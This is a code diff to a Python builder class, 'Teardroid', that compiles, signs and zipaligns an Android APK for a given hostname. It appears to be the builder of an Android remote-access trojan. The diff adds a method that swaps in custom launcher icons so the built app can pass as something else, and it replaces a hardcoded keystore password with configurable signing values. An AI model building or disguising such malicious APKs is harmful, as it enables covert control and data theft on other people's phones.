@@ -2,6 +2,8 @@ import os
 import sys
 from colorama import Fore, Style
 import platform
+import shutil
+from Config import SINGING_INFO
 
 
 class Teardroid:
@@ -11,6 +13,8 @@ class Teardroid:
         self.AppInfo = os.path.join(os.getcwd(
         ), self.source_folder , "smali", "com", "example", "teardroidv2", "AppInfo.smali")
         self.os = os.name
+        self.icon_path = None
+        self.key_config = SINGING_INFO()
 
     def build(self, hostname) -> None:
         self.print_result("Building Teardroid")
@@ -78,7 +82,7 @@ class Teardroid:
         else:
             apksigner = os.path.join(os.getcwd(), "apksigner.bat")
         os.system(apksigner +
-                  " sign --ks hacksec.jks --ks-key-alias key0 --ks-pass pass:root1337 --key-pass pass:root1337 " + self.name + ".apk")
+                  " sign --ks "+self.key_config.ks+" --ks-key-alias "+self.key_config.ks_key_alias+" --ks-pass pass:"+self.key_config.ks_pass+" --key-pass pass:"+self.key_config.key_pass+" " + self.name + ".apk")
 
     def CompressAPK(self) -> None:
         zipalign = None
@@ -93,6 +97,19 @@ class Teardroid:
             zipalign = os.path.join(os.getcwd(), "zipalign.exe")
         os.system(zipalign + " -v 4 " + self.name +
                   "_uncompressed.apk " + self.name + ".apk")
+    
+    def Change_icon(self,Icon_path) -> None:
+        folders_to_copy = ['mipmap-anydpi-v26', 'mipmap-hdpi', 'mipmap-ldpi',"mipmap-mdpi","mipmap-xhdpi","mipmap-xxhdpi","mipmap-xxxhdpi","values"]
+        destination_folder = os.path.join(os.getcwd(), self.source_folder, "res")
+        for folder_name in folders_to_copy:
+            source_folder = os.path.join(Icon_path, folder_name)
+            destination_path = os.path.join(destination_folder, folder_name)
+            if os.path.exists(destination_path):
+                shutil.copytree(source_folder, destination_path, dirs_exist_ok=True)
+            else:
+                shutil.copytree(source_folder, destination_path)
+        self.print_result("Icons has been changed successfully")
+                
 
     def Clear(self) -> None:
         os.remove(self.name + ".apk.idsig")
